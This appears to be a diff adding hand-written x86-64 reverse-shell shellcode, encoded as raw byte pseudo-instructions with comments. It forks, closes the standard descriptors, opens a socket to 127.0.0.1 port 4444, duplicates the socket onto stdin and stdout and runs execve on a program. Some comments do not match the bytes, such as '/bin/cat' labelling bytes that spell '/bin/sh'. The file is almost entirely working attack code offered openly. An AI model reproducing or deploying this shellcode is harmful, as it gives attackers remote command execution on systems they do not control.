@@ -1,0 +1,112 @@
+# hand-written simple reverse shell with forking
+# uses only .start label and DB,DW,DD and DQ pseudo instructions
+
+## data
+DQ 0x0068732f6e69622f # /bin/cat
+DQ 0x0000000000000078 # 1st argument - name of the file executed 
+DQ 0x0000000000000000 
+DQ 0x0100007F5c110002 # 0002 - AF_INET, 5C 11 - 4444, 7F 00 00 01 - 127.0.0.1 
+
+#0x98
+
+# fork
+.start
+DW 0x396A
+DB 0x58
+DW 0x050F
+
+DB 0x48 
+DW 0xC085 # test rax, rax (check if rax is 0) (with operand size 64-bit)
+# jump if pid of fork is 0 (it is a forked process)
+DW 0x0874	
+
+# exit if original process
+DB 0x48
+DW 0xFF31
+DW 0x3C6A
+DB 0x58
+DW 0x050F
+
+# close file descriptor 0 (stdin)
+DW 0x036A
+DB 0x58
+DW 0x006A
+DB 0x5F
+DW 0x050F
+
+# close stdout
+DW 0x036A
+DB 0x58
+DW 0x016A
+DB 0x5F
+DW 0x050F
+
+# close stderr
+DW 0x036A
+DB 0x58
+DW 0x026A
+DB 0x5F
+DW 0x050F
+
+
+# create socket
+DW 0x296A
+DB 0x58
+DW 0x026A
+DB 0x5F
+DD 0x00000168
+DB 0x00
+DB 0x5E
+DD 0x00000668 
+DB 0x00
+DB 0x5A
+DW 0x050F
+
+# connect
+DW 0x2A6A
+DB 0x58
+DW 0x006A # AF_INET
+DB 0x5F
+DD 0x00009068
+DB 0x00 # address of the structure
+DB 0x5E
+DD 0x00001068
+DB 0x00 # length of the structure - 16
+DB 0x5A
+DW 0x050F
+
+# dup
+# 00 -> 01
+DW 0x206A
+DB 0x58
+DW 0x006A
+DB 0x5F
+DW 0x050F
+
+# 00 -> 02
+DW 0x206A
+DB 0x58
+DW 0x050F
+
+## syscall execve
+DW 0x3B6A # PUSH 0x3B
+DB 0x58 # POP rax
+DW 0x786A
+DB 0x5F # POP rdi
+DD 0x00008068
+DB 0x00
+DB 0x5E # POP rsi
+DD 0x00000068
+DB 0x00
+DB 0x5A # POP rdx
+DW 0x050F
+
+## syscall exit
+DW 0x3148 
+DB 0xFF # xor rdi, rdi
+DW 0x3C6A
+DB 0x58 # POP rax
+DW 0x050F # call interrupt
+
+
+DW 0xFEEB # jump to itself, infinite loop
